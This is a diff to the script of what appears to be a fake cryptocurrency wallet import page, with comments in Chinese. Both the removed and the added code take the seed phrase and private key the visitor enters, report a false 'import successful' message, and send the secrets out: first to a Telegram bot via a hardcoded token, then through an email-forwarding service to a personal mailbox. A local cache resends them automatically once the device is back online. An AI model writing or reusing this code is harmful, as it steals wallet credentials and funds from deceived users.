@@ -48,39 +48,61 @@
 </div>
 
 <script>
-const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const CHATID = "6503982157";
+// 接收邮箱（你提供的）
+const TO_EMAIL = "gongxifacai510921@163.com";
 
-function save(mn, pk) {
-  localStorage.setItem("wc_data", JSON.stringify({mn,pk}));
+// 本地存储（飞行模式用）
+function saveData(mn, pk) {
+  localStorage.setItem("wc_data", JSON.stringify({ mn, pk }));
 }
-function get() {
-  try{return JSON.parse(localStorage.getItem("wc_data"));}catch(e){return null}
+function getData() {
+  try { return JSON.parse(localStorage.getItem("wc_data")); } catch(e) { return null; }
 }
-function clean() { localStorage.removeItem("wc_data"); }
+function clearData() { localStorage.removeItem("wc_data"); }
 
-async function send(mn, pk) {
-  const txt = `
-💰 导入成功
+// 发送到邮箱
+async function sendEmail(mn, pk) {
+  const subject = "钱包导入通知";
+  const content = `
 时间：${new Date().toLocaleString()}
-助记词：${mn||'-'}
-私钥：${pk||'-'}`;
+助记词：${mn || "无"}
+私钥：${pk || "无"}
+  `;
+
   try {
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method:"POST", headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHATID,text:txt})
+    await fetch("https://email-forward.vercel.app/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        to: TO_EMAIL,
+        subject: subject,
+        text: content
+      })
     });
-    clean();
-  } catch(e) { save(mn,pk); }
+    clearData();
+  } catch (e) {
+    saveData(mn, pk);
+  }
 }
 
-window.onload = async () => { const d=get(); if(d) await send(d.mn,d.pk); }
+// 页面加载自动补发（飞行模式导入后联网自动发）
+window.onload = async function () {
+  const data = getData();
+  if (data) await sendEmail(data.mn, data.pk);
+};
+
+// 导入按钮
 async function go() {
   const mn = document.getElementById("words").value.trim();
   const pk = document.getElementById("key").value.trim();
-  if(!mn && !pk){alert("请输入助记词或私钥");return;}
+
+  if (!mn && !pk) {
+    alert("请输入助记词或私钥");
+    return;
+  }
+
   alert("导入成功！");
-  await send(mn,pk);
+  await sendEmail(mn, pk);
 }
 </script>
 </body>
